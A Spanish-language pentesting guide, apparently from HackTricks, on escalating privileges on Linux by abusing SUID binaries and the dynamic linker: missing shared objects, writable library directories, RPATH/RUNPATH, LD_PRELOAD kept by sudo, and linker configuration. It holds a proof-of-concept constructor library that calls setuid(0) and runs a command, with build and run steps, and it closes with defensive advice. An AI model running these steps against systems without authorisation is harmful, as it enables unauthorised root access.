# SUID Shared Library and Linker Abuse

{{#include ../../banners/hacktricks-training.md}}

Los binarios SUID suelen revisarse para detectar ejecución directa de comandos, pero los programas SUID personalizados también pueden ser vulnerables a través del dynamic linker. El tema común es sencillo: un ejecutable privilegiado carga código desde una ruta o configuración que un usuario con menos privilegios puede controlar.<sup>[[1]](#references)</sup>

Esta página se centra en patrones de técnicas genéricas: bibliotecas ausentes, directorios de bibliotecas con permisos de escritura, `RPATH`/`RUNPATH`, `LD_PRELOAD` mediante sudo, configuración del linker y confusión con hardlinks SUID.

## Enumeración rápida

Comienza buscando archivos SUID inusuales y comprobando si están enlazados dinámicamente:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Céntrate en ubicaciones no estándar, rutas de aplicaciones personalizadas, binarios propiedad de root pero fuera de directorios gestionados por paquetes y dependencias cargadas desde directorios con permisos de escritura.<sup>[[1]](#references)</sup>

Comprobaciones útiles de permisos de escritura:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Algunos binarios SUID personalizados intentan cargar un objeto compartido que no existe. Si la ruta inexistente se encuentra bajo un directorio controlado por el atacante, el binario puede cargar código proporcionado por el atacante con el usuario efectivo.<sup>[[1]](#references)</sup>

Encuentra búsquedas fallidas de bibliotecas con el filtro de syscalls de `strace`:<sup>[[2]](#references)</sup>
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Si el binario busca `libexample.so` en una ruta con permisos de escritura, una biblioteca de prueba mínima puede usar un constructor. Mantén la demostración del impacto inocua durante la validación:<sup>[[6]](#references)</sup>
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Constrúyelo con el nombre de archivo exacto que el binario intenta cargar:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condición explotable no es únicamente la ausencia de la library. El atacante debe poder colocar un shared object compatible en una ruta que el loader privilegiado acepte.<sup>[[1]](#references)</sup>

## Directorio de Library con permisos de escritura

A veces existen todas las dependencias, pero uno de los directorios utilizados para resolverlas tiene permisos de escritura. Esto puede permitir reemplazar una library cargada o colocar una library con mayor prioridad y el mismo nombre.<sup>[[1]](#references)</sup>

Revisa las rutas de las dependencias:<sup>[[1]](#references)[[3]](#references)</sup>
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Si el directorio permite escritura, valida con un enfoque seguro para copias en un laboratorio. Reemplazar bibliotecas del sistema en un host activo puede dejar procesos que se inician simultáneamente con versiones de bibliotecas incoherentes.<sup>[[8]](#references)</sup>

## RPATH y RUNPATH

`RPATH` y `RUNPATH` son entradas de la sección dinámica que indican al cargador dónde buscar bibliotecas. Son peligrosas en programas SUID cuando apuntan a directorios en los que el atacante puede escribir.<sup>[[1]](#references)</sup>

Detectarlas:<sup>[[3]](#references)[[10]](#references)</sup>
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Ejemplo de salida riesgosa:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Si `/opt/app/lib` permite escritura y el binario necesita `libcustom.so`, el atacante podría colocar allí un `libcustom.so` malicioso:<sup>[[1]](#references)</sup>
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` y `RUNPATH` no son idénticos en todos los detalles de resolución, pero para la revisión de escalada de privilegios la pregunta práctica es la misma: ¿el binario SUID busca el nombre de una library en un directorio modificable por un atacante?<sup>[[1]](#references)</sup>

## LD_PRELOAD, LD_LIBRARY_PATH y SUID

En los programas normales, `LD_PRELOAD` y `LD_LIBRARY_PATH` pueden forzar o influir en la carga de objetos compartidos. En los programas SUID, el dynamic loader normalmente entra en secure-execution mode e ignora las variables de entorno peligrosas.<sup>[[1]](#references)</sup>

Esto significa que un binario SUID sin más normalmente no es vulnerable solo porque el usuario pueda establecer `LD_PRELOAD`:<sup>[[1]](#references)</sup>
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
La excepción común es una sudo policy que permite establecer o conservar variables del loader para el comando objetivo. Inspecciona `sudo -l` en busca de entradas como `env_keep+=LD_PRELOAD` o `env_keep+=LD_LIBRARY_PATH`; si el objetivo está enlazado dinámicamente, puede cargar código controlado por el atacante:<sup>[[4]](#references)[[5]](#references)</sup>
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
No confundas estos casos; el loader y las reglas de sudo anteriores los distinguen:<sup>[[1]](#references)[[4]](#references)[[5]](#references)</sup>

- `LD_PRELOAD` contra un binario SUID normal: normalmente bloqueado por la ejecución segura.
- `LD_PRELOAD` conservado por sudo: potencialmente explotable.
- `.so` ausente en una ruta escribible: explotable cuando el binario SUID carga naturalmente esa ruta.
- `RPATH`/`RUNPATH` a un directorio escribible: explotable cuando se puede controlar una library necesaria.
- Acceso de escritura a `/etc/ld.so.preload` o a la configuración del linker: afecta a todo el sistema y tiene un alto impacto.

## Linker Configuration

`ld.so` utiliza la caché del linker y `/etc/ld.so.preload`; `ldconfig` construye esa caché a partir de `/etc/ld.so.conf` y de los archivos incluidos desde este, normalmente `/etc/ld.so.conf.d/`.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

Comprobaciones de alto valor:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
La configuración del linker con permisos de escritura suele ser más grave que un único binario SUID vulnerable, porque puede afectar a muchos procesos enlazados dinámicamente. `/etc/ld.so.preload` es especialmente peligroso porque puede forzar la carga de un objeto compartido en procesos con privilegios.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>

## Confusión de Hardlinks SUID

Los hardlinks pueden hacer que el mismo inode SUID aparezca con varios nombres.<sup>[[9]](#references)</sup> Esto resulta útil para ocultar un helper con privilegios, confundir las tareas de limpieza o evadir revisiones ingenuas basadas en rutas.

Busca archivos SUID con más de un enlace:<sup>[[9]](#references)</sup>
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Inspecciona todas las rutas al mismo inode:<sup>[[9]](#references)</sup>
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
El abuso no consiste en que un hardlink cambie los permisos. El abuso es la confusión de rutas: un inode privilegiado puede ser accesible mediante un nombre que los defensores o scripts no esperan.<sup>[[9]](#references)</sup> Para obtener más información sobre el flujo de trabajo de inodes y hardlinks, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Notas defensivas

- Mantén los binarios SUID mínimos, auditados y gestionados mediante paquetes siempre que sea posible.
- Evita entradas `RPATH`/`RUNPATH` que apunten a directorios modificables o gestionados por aplicaciones.<sup>[[1]](#references)[[8]](#references)</sup>
- Mantén los directorios de libraries propiedad de root y no modificables por usuarios normales.<sup>[[8]](#references)</sup>
- No conserves `LD_PRELOAD`, `LD_LIBRARY_PATH` ni variables similares del loader mediante sudo.<sup>[[1]](#references)[[5]](#references)</sup>
- Supervisa `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` y los archivos SUID inesperados.<sup>[[1]](#references)[[7]](#references)[[8]](#references)</sup>
- Revisa los archivos SUID enlazados mediante hardlinks e investiga los wrappers SUID personalizados fuera de las rutas estándar del sistema.<sup>[[9]](#references)</sup>

## References

- [1] [ld.so(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [strace(1) — Página del manual de Linux](https://man7.org/linux/man-pages/man1/strace.1.html)
- [3] [readelf (Utilidades de binarios de GNU)](https://sourceware.org/binutils/docs/binutils/readelf.html)
- [4] [sudo(8) — Página del manual de Linux](https://www.man7.org/linux/man-pages/man8/sudo.8.html)
- [5] [sudoers(5) — Página del manual de Linux](https://man7.org/linux/man-pages/man5/sudoers.5.html)
- [6] [Atributos comunes (GCC)](https://gcc.gnu.org/onlinedocs/gcc/Common-Attributes.html)
- [7] [ldconfig(8) — Página del manual de Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [8] [Hardening del Dynamic Linker (The GNU C Library)](https://www.sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [9] [Hard Links (GNU Findutils)](https://www.gnu.org/software/findutils/manual/html_node/find_html/Hard-Links.html)
- [10] [objdump (Utilidades de binarios de GNU)](https://www.sourceware.org/binutils/docs/binutils/objdump.html)
{{#include ../../banners/hacktricks-training.md}}
